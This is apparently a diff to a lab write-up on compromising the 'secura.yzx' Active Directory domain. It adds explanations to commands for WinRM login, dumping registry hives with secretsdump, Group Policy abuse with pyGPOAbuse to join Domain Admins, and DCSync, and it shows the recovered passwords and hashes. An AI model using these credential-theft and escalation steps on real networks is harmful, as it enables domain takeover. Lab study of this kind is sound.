@@ -192,7 +192,7 @@ We used the `apache` password to log into `192.168.216.96` (hostname `era`) over
 evil-winrm -i 192.168.216.96 -u apache -p 'New2Era4.!'
 ```
 
-We got a shell as the local user **`era\apache`** — a low-privileged local account.
+WinRM (port 5985) is a remote management service, and Evil-WinRM turns it into a PowerShell shell. We got a shell as the local user **`era\apache`** — a low-privileged local account.
 
 ![](/assets/img/posts/secura/apache-shell.jpg)
 
@@ -294,7 +294,12 @@ era\administrator
 
 ## 8.0 Credential Dumping with secretsdump
 
-Now that we are Administrator, the next goal is to collect credentials to reach the Domain Controller. Windows keeps secrets in a few places — the SAM (local account hashes) and LSA (service-account passwords, stored in a readable form).
+Now that we are Administrator on ERA, the next goal is to collect credentials that get us to the Domain Controller. Windows stores secrets in a few places:
+
+- **SAM** — hashes of local accounts (like Administrator).
+- **LSA Secrets** — passwords of services that run as a specific account, stored in a recoverable form.
+
+We can't read these files while Windows is running (they're locked), so we saved copies of the registry hives and parsed them offline:
 
 We saved the `SAM`, `SYSTEM` and `SECURITY` hives and parsed them offline:
 
@@ -308,6 +313,8 @@ reg save HKLM\SECURITY C:\Users\apache.ERA\Documents\security.hiv
 impacket-secretsdump -sam sam.hiv -system system.hiv -security security.hiv LOCAL
 ```
 
+`SYSTEM` holds the boot key that decrypts the other two hives — that is why we saved all three together.
+
 Two useful things came out:
 
 - **The Administrator password in cleartext** — `Almost4There8.?` — from the `_SC_MySQL` LSA secret (MySQL runs as Administrator, so its password is stored in a readable form).
@@ -318,7 +325,7 @@ Two useful things came out:
 (Unknown User):Almost4There8.?
 ```
 
-No cached domain logins on ERA.
+No cached domain logins on ERA, so this machine alone does not reach the domain — we need a domain account.
 
 ---
 
@@ -341,7 +348,9 @@ administrator Almost4There8.?
 charlotte     Game2On4.!
 ```
 
-The `administrator` entry matched the password we had already recovered from LSA. The `charlotte` entry was new — a domain user's password.
+A custom database named `creds` is a strong signal — it looks like a home-grown place to store passwords, which applications should never do.
+
+The `administrator` entry matched the password we had already recovered from LSA in section 8.0. The `charlotte` entry was new — a domain user's password. That is our ticket into the domain: with a valid domain account we can now talk to the Domain Controller directly.
 
 ### 9.2 GPO Abuse — charlotte to Domain Admins
 
@@ -362,15 +371,19 @@ impacket-secretsdump secura.yzx/charlotte:'Game2On4.!'@192.168.216.97
 [-] DRSR SessionError: code: 0x20f7 - ERROR_DS_DRA_BAD_DN
 ```
 
-So we went with the expected path instead — GPO abuse. charlotte has **WriteOwner on the Default Domain Policy** (GUID `{31B2F340-016D-11D2-945F-00C04FB984F9}`).
+charlotte is a normal domain user, not an admin. But there is a path to Domain Admin here — Group Policy abuse.
 
-We used `pyGPOAbuse` to plant a scheduled task inside the Default Domain Policy that adds charlotte to Domain Admins:
+A **GPO (Group Policy Object)** is a set of settings that the Domain Controller pushes out to computers and users. For example, a GPO can say "run this scheduled task at logon" for every machine in the domain. If a GPO holds a scheduled task, that task runs as **SYSTEM** on the machines that apply it — including the Domain Controller.
+
+charlotte has **WriteOwner on the Default Domain Policy** (GUID `{31B2F340-016D-11D2-945F-00C04FB984F9}`). WriteOwner means she can change who owns the GPO — and whoever owns it can edit its contents. That is the gap we abuse.
+
+We used `pyGPOAbuse` to plant a scheduled task inside the Default Domain Policy. The task runs one command: add charlotte to the Domain Admins group.
 
 ```bash
 python3 pygpoabuse.py secura.yzx/charlotte:'Game2On4.!' -gpo-id '31B2F340-016D-11D2-945F-00C04FB984F9' -command 'net group "Domain Admins" charlotte /add /domain' -dc-ip 192.168.216.97
 ```
 
-We then forced the policy to apply from charlotte's WinRM shell on the DC:
+We then forced the policy to apply straight away (normally Group Policy refreshes on a timer, but we don't want to wait):
 
 ```powershell
 gpupdate /force
@@ -380,20 +393,25 @@ The scheduled task ran as SYSTEM on the Domain Controller and added charlotte to
 
 ### 9.3 DCSync — Full Domain Compromise
 
-With charlotte now in Domain Admins, a DCSync as charlotte dumped every account hash in the domain:
+charlotte is now a Domain Admin. That unlocks **DCSync**.
+
+DCSync is a technique that asks the Domain Controller to send us its password database (the NTDS.dit secrets). It normally only works for Domain Controllers and Domain Admins, because it needs a special right — "Replicate Directory Changes". charlotte's first attempt failed earlier because she did not have that right. Now, as a Domain Admin, she does:
 
 ```bash
 impacket-secretsdump secura.yzx/charlotte:'Game2On4.!'@192.168.216.97
 ```
 
-The Domain Administrator and krbtgt hashes were recovered, giving full control of `secura.yzx`:
+The dump gave us every account hash in the domain, including the two most valuable ones:
 
 ```
 Administrator : d38e7c66048f80fd9566ab85afca76b1
 krbtgt        : 431f60ffa71152f8445bea272663d7c3
 ```
 
-The krbtgt hash is the domain's Kerberos master key — possession of it allows forging golden tickets, giving persistent Domain Admin access.
+- **Administrator** hash lets us log in anywhere as the domain's top account (pass-the-hash).
+- **krbtgt** is the Kerberos master key. Whoever holds it can forge golden tickets — self-signed Kerberos tickets that give persistent Domain Admin access, even if every password is changed.
+
+With both hashes, we have full and lasting control of `secura.yzx`. Domain compromise is complete.
 
 ---
 
